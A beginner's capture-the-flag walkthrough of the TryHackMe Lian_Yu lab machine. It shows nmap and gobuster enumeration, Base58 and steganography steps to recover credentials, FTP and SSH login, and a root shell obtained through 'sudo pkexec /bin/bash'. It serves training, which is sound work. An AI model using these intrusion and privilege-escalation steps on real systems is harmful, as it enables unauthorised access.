# ***TryHackMe***- Lian_YU : A beginner level security challenge

Link to THM Room : [Lian_Yu](https://tryhackme.com/room/lianyu)

## Methodology 
- *Port scanning*: nmap
- *Directory fuzzing*: gobuster
- *Decoding*: cyberchef(mentioned in room as well)
- *Steganography*: steghide, hexedit
- *Sudo abuse for Privilege Escilation* 

***Let's hack !!!***

- ***nmap to view ports running on the system:***

*nmap -sC -sV -Pn -oN lian 10.10.x.x*

<img src="/images/IMG_20200709_230746.JPG">

We have web server running on Port 80, let's take a glance

<img src="/images/welcome.png">

Nothing interesing here or in source code.

- ***Let's fire Gobuster to find some directories:***

> ***./gobuster dir -u http://10.10.x.x -w /your_path_to_directory-list-2.3-medium.txt***

>> found : */island*

We have hit on a directory, /island, let's visit the directory we found on the website running and check source code to see if we can find some hints.

<img src="/images/IMG_20200709_230106.JPG">

*Vigilante* don't know what it is for, still copy it in a file might come in handy later.

Now since the directory we found (/island) earlier had *(Status: 301)*, let's run gobuster to find other directories in it.

> ***./gobuster dir -u http://10.10.x.x/island -w /your_path_to_directory-list-2.3-medium.txt***

Oh a hit on 4-digit number directory here, well this answers our 2nd question

After viewing the directory and it's code, we can find a note or potential hint here.

<img src="/images/IMG_20200709_225839.JPG">

Much of a file exists with a .ticket extention, hmmm

Well let's run gobuster again to find the hidden file with .ticket extention

> *./gobuster dir -u http://10.10.x.x/island/(4-digit_directory) -w /your_path_to_directory-list-2.3-medium.txt -x .ticket*

***(Check the gobuster help page to see -x flag use if you don't know)***

*This directory name is the answer to the 3rd question.*

Quickely viewing the .ticket directory, we find a block of string. Interesting !

<img src="/images/IMG_20200709_230404.JPG">

Well the string is potentially a password to something, and it's encoded.
Let's Decode it.

- ***Cyberchef to decode*** 

*quick hint the sting is Base58 encoded*

<img src="/images/IMG_20200709_225921.JPG">

This is definately a password, but to what??

Well let's try FTP

Remember we found *Vigilante*, it's a username of some kind.
Let's use it for FTP login with the password we decoded.
- ftp 10.10.x.x

What do we know, logged in.

Enumerate here : *ls -l*

<img src="/images/IMG_20200709_230953.JPG">

Let's *get* those image files, hopefully can get some answers with steghide etc.

> *get Leave_me_alone.png*

> *get Queen's_Gambit.png*

> *get aa.jpg*

(the *get* *filename* downloads the file from ftp server)

Open the files...
Oh! hit an error trying to open *Leave_me_alone.png*

let's check this file

> *file Leave_me_alone.png*
>> *Leave_me_alone.png: data*

Fishy right? Checking the file siganture or magic number of this .png file, the first few bytes have been modified which resulted the error we encountered.

> *xxd Leave_me_alone.png | head*
>> *00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR*

The file's magic number is incorrect.

Well Google to find the right magic number or just check the magic number of the another .png file we have Queen's_Gambit.png, cause this file did pop up right.

> *xxd "Queen's_Gambit.png" | head*

Comparing these two we can make necessary changes to make the corrupt file right.

For reader convinence correct magic number for .png file is : ***89 50 4E 47 0D 0A 1A 0A***

- ***hexeditor to bake some magic code:***

> *hexedit Leave_me_alone.png*

<img src="/images/IMG_20200709_230018.JPG">

Now after we fix the magic number, it is viewable, make sure though

> *file Leave_me_alone.png*

>> *Leave_me_alone.png: PNG image data, 845 x 475, 8-bit/color RGBA, non-interlace*

<img src="/images/IMG_20200709_230259.JPG"> 

Found *password*

Well i found this password is not for SSH, so moving ahead to find more hints.
Certainly we have 2 more images to look upon.

***-steghide: we have a .jpg file so let's check it.***

using *password* as passphrase for steghide.

> *steghide extract -sf aa.jpg*

>> *wrote extracted data to "ss.zip".*

Got a zip file *ss.zip*.
Unzip and check the file.

> *unzip ss.zip*

Now we have two more files.
Checked *passwd.txt* and here's a Note, but did't find it useful. But feel free to check might get something.

Checked *shado* and there's a string. 

A *password_string*, now this is certainly the password for ssh, but I don't have a user. Maybe I missed something...

Going back to *ftp 10.10.x.x*

> *ls*
> *cd ..*
> *ls*

<img src="/images/IMG_20200709_231124.JPG"> 

Now here's another user with *Vigilante*, can't *cd* into this another user, so maybe try ssh with this user.

> *ssh (another_user)@10.10.x.x*
>> *password in shado*

<img src="/images/IMG_20200709_230719.JPG"> 

OMG! We're in...
The user flag is lying here.

> *ls*
> *cat user.txt*

- ***Privilege Escilation:***

Following tradition, check current user has sudo permissions.

> *sudo -l*

>> *User <user> may run the following commands on LianYu:
      (root) PASSWD: /usr/bin/pkexec*

User has permission to run */usr/bin/pkexec*

As a linux nerd, just check the manual for *pkexec*

> *man pkexec*

<img src="/images/IMG_20200709_230212.JPG"> 

Hmmm, great! The pkexec allows users to execute commands as other users. 

Now let's just abuse *pkexec* to spawn a root shell:

> *sudo /usr/bin/pkexec /bin/bash*
(/bin/bash shell is generally spawned as root)

Success!!! In as *root*

> *ls*
> *cat root.txt*

<img src="/images/IMG_20200709_230839.JPG">

Alas!!! Found the root.txt 
Pretty basic and fun machine.

***Thank you for reading. B)***
